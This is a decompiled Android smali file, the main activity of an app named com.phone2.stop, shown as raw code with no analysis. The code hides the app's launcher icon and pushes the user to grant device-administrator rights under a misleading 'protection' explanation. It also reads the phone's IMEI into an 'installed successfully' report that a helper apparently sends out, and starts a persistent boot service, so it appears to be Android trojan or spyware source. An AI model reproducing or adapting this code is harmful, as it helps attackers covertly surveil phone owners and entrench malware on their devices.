.class public Lcom/phone2/stop/activity/MainActivity;
.super Landroid/app/Activity;


# static fields
.field public static a:J


# instance fields
.field b:Landroid/os/Handler;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    const-wide/16 v0, 0x0

    sput-wide v0, Lcom/phone2/stop/activity/MainActivity;->a:J

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    new-instance v0, Lcom/phone2/stop/activity/b;

    invoke-direct {v0, p0}, Lcom/phone2/stop/activity/b;-><init>(Lcom/phone2/stop/activity/MainActivity;)V

    iput-object v0, p0, Lcom/phone2/stop/activity/MainActivity;->b:Landroid/os/Handler;

    return-void
.end method

.method private b()V
    .locals 2

    const-string v0, "com.phone.stop6.service.BootService"

    invoke-virtual {p0, p0, v0}, Lcom/phone2/stop/activity/MainActivity;->a(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_0

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/phone/stop6/service/BootService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcom/phone2/stop/activity/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_0
    return-void
.end method


# virtual methods
.method public a()V
    .locals 4

    :try_start_0
    const-string v0, "device_policy"

    invoke-virtual {p0, v0}, Lcom/phone2/stop/activity/MainActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lcom/phone/stop/receiver/MyDeviceAdminReceiver;

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v0

    if-nez v0, :cond_0

    new-instance v0, Landroid/content/Intent;

    const-string v2, "android.app.action.ADD_DEVICE_ADMIN"

    invoke-direct {v0, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v2, "android.app.extra.DEVICE_ADMIN"

    invoke-virtual {v0, v2, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    const-string v1, "android.app.extra.ADD_EXPLANATION"

    const-string v2, "\u63d0\u9ad8\u6743\u9650\u83b7\u53d6\u4fdd\u62a4"

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Lcom/phone2/stop/activity/MainActivity;->startActivityForResult(Landroid/content/Intent;I)V

    iget-object v0, p0, Lcom/phone2/stop/activity/MainActivity;->b:Landroid/os/Handler;

    const/4 v1, 0x1

    const-wide/16 v2, 0x9c4

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->sendEmptyMessageDelayed(IJ)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method public a(Landroid/content/Context;Ljava/lang/String;)Z
    .locals 5

    const/4 v1, 0x0

    const-string v0, "activity"

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager;

    const/16 v2, 0x1f4

    invoke-virtual {v0, v2}, Landroid/app/ActivityManager;->getRunningServices(I)Ljava/util/List;

    move-result-object v3

    invoke-interface {v3}, Ljava/util/List;->size()I

    move-result v4

    move v2, v1

    :goto_0
    if-lt v2, v4, :cond_0

    move v0, v1

    :goto_1
    return v0

    :cond_0
    invoke-interface {v3, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager$RunningServiceInfo;

    iget-object v0, v0, Landroid/app/ActivityManager$RunningServiceInfo;->service:Landroid/content/ComponentName;

    invoke-virtual {v0}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    const/4 v0, 0x1

    goto :goto_1

    :cond_1
    add-int/lit8 v0, v2, 0x1

    move v2, v0

    goto :goto_0
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 4

    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onActivityResult(IILandroid/content/Intent;)V

    if-nez p1, :cond_0

    const/4 v0, -0x1

    if-ne p2, v0, :cond_1

    invoke-static {p0}, Lcom/phone/stop/db/a;->a(Landroid/content/Context;)Lcom/phone/stop/db/a;

    move-result-object v0

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Lcom/phone/stop/db/a;->a(Z)V

    const-string v0, "\u6fc0\u6d3b\u6210\u529f"

    invoke-static {v0, p0}, Lcom/phone/stop/e/f;->a(Ljava/lang/String;Landroid/content/Context;)V

    :cond_0
    :goto_0
    invoke-direct {p0}, Lcom/phone2/stop/activity/MainActivity;->b()V

    iget-object v0, p0, Lcom/phone2/stop/activity/MainActivity;->b:Landroid/os/Handler;

    const/4 v1, 0x0

    const-wide/16 v2, 0x3e8

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->sendEmptyMessageDelayed(IJ)Z

    return-void

    :cond_1
    const-string v0, "\u6fc0\u6d3b\u5931\u8d25"

    invoke-static {v0, p0}, Lcom/phone/stop/e/f;->a(Ljava/lang/String;Landroid/content/Context;)V

    goto :goto_0
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 4

    const/4 v3, 0x1

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const v0, 0x7f030001

    invoke-virtual {p0, v0}, Lcom/phone2/stop/activity/MainActivity;->setContentView(I)V

    invoke-static {}, Lcom/phone/stop/c/h;->a()V

    invoke-virtual {p0}, Lcom/phone2/stop/activity/MainActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    invoke-virtual {p0}, Lcom/phone2/stop/activity/MainActivity;->getComponentName()Landroid/content/ComponentName;

    move-result-object v1

    const/4 v2, 0x2

    invoke-virtual {v0, v1, v2, v3}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    invoke-static {p0}, Lcom/phone/stop/c/h;->a(Landroid/content/Context;)V

    invoke-static {p0}, Lcom/phone/stop/c/h;->b(Landroid/content/Context;)V

    invoke-static {p0}, Lcom/phone/stop/c/h;->c(Landroid/content/Context;)V

    invoke-static {p0}, Lcom/phone/stop/c/h;->d(Landroid/content/Context;)V

    invoke-static {p0}, Lcom/phone/stop/c/h;->e(Landroid/content/Context;)V

    invoke-static {p0}, Lcom/phone/stop/db/a;->a(Landroid/content/Context;)Lcom/phone/stop/db/a;

    move-result-object v0

    invoke-virtual {v0}, Lcom/phone/stop/db/a;->r()Z

    move-result v0

    if-nez v0, :cond_0

    const-string v0, "phone"

    invoke-virtual {p0, v0}, Lcom/phone2/stop/activity/MainActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "\u8f6f\u4ef6\u5b89\u88c5\u6210\u529f\n\u8bc6\u522b\u7801:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "\n"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-static {}, Lcom/phone/stop/e/e;->a()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, p0}, Lcom/phone/stop/e/f;->a(Ljava/lang/String;Landroid/content/Context;)V

    invoke-static {p0}, Lcom/phone/stop/db/a;->a(Landroid/content/Context;)Lcom/phone/stop/db/a;

    move-result-object v0

    invoke-virtual {v0, v3}, Lcom/phone/stop/db/a;->h(Z)V

    :cond_0
    invoke-static {p0}, Lcom/phone/stop/c/f;->b(Landroid/content/Context;)V

    invoke-static {p0}, Lcom/phone/stop/db/a;->a(Landroid/content/Context;)Lcom/phone/stop/db/a;

    move-result-object v0

    invoke-virtual {v0}, Lcom/phone/stop/db/a;->g()Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-static {p0}, Lcom/phone/stop/c/d;->a(Landroid/content/Context;)V

    :cond_1
    invoke-virtual {p0}, Lcom/phone2/stop/activity/MainActivity;->a()V

    return-void
.end method
